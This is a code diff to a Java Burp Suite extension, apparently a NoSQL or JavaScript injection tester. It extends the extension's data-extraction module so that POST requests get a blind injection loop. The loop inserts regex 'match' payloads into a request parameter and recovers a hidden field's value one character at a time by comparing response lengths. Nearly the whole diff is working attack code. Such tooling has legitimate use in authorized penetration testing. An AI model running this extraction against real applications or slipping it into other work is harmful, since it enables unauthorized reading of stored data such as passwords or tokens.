@@ -405,10 +405,9 @@ public class NNN implements BurpExtension {
                         int position = 0;
                         StringBuilder sb = new StringBuilder();
                         while (true) {
-                            ArrayList<HttpRequestResponse> responseList = new ArrayList<>();
                             HttpRequestResponse response1 = null; HttpRequestResponse response2 = null;
                             Character extractedLetter = null;
-                            String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+                            String characters = "abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                             char ch;
                             for (int i=0; i< characters.length(); i++) {
                                 ch = characters.charAt(i);
@@ -422,7 +421,6 @@ public class NNN implements BurpExtension {
                                 payload.append(".*')\"");
                                 request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, index) + payload + requestResponse.request().toString().substring(index));
                                 response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
-                                responseList.add(response2receive);
                                 if (response1 == null){
                                     response1 = response2receive;
                                 } else if (response2 == null && response2receive.response().toString().length() != response1.response().toString().length()){
@@ -470,13 +468,53 @@ public class NNN implements BurpExtension {
                 HttpRequest request2send;
                 HttpRequestResponse response2receive;
                 HttpService httpService = requestResponse.request().httpService();
+                if (requestResponse.request().method().equals("GET")) {
+                    // Identify field length
+                    int fieldLength = identifyFieldLength(requestResponse, startIndex, endIndex, httpService);
 
-                // Identify field length
-                int fieldLength = identifyFieldLength(requestResponse, startIndex, endIndex, httpService);
+                    // Enumerate the field
+                    if (fieldLength > 0) {
+                        enumerateField(requestResponse, startIndex, endIndex, httpService, fieldLength);
+                    }
+                } else if (requestResponse.request().method().equals("POST")){
+                    int position = 0;
+                    StringBuilder sb = new StringBuilder();
 
-                // Enumerate the field
-                if (fieldLength > 0) {
-                    enumerateField(requestResponse, startIndex, endIndex, httpService, fieldLength);
+                    while (true) {
+                        HttpRequestResponse response1 = null; HttpRequestResponse response2 = null;
+                        Character extractedLetter = null;
+                        String characters = "abcdefghijklmnopqrstuvwxyz_ABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890";
+                        char ch;
+                        for (int i=0; i< characters.length(); i++) {
+                            ch = characters.charAt(i);
+                            StringBuilder payload = new StringBuilder();
+                            payload.append(".match('^.{");
+                            payload.append(Integer.toString(position));
+                            payload.append("}");
+                            payload.append(ch);
+                            payload.append(".*')");
+                            request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, endIndex) + payload + requestResponse.request().toString().substring(endIndex));
+                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
+                            if (response1 == null){
+                                response1 = response2receive;
+                            } else if (response2 == null && response2receive.response().toString().length() != response1.response().toString().length()){
+                                response2 = response2receive;
+                            } else if (response2 != null && response2receive.response().toString().length() == response1.response().toString().length()){
+                                extractedLetter = response2.request().toString().charAt(response2.request().toString().lastIndexOf(".*')")-1);
+                                break;
+                            } else if (response2 != null && response2receive.response().toString().length() == response2.response().toString().length()){
+                                extractedLetter = response1.request().toString().charAt(response1.request().toString().lastIndexOf(".*')")-1);
+                                break;
+                            }
+                        }
+                        if (extractedLetter != null){
+                            infoPane.setText(infoPane.getText() + extractedLetter);
+                            sb.append(extractedLetter);
+                        } else {
+                            break;
+                        }
+                        position++;
+                    }
                 }
             } catch (Exception e) {
                 api.logging().logToError("[!] Data Extraction module failed");
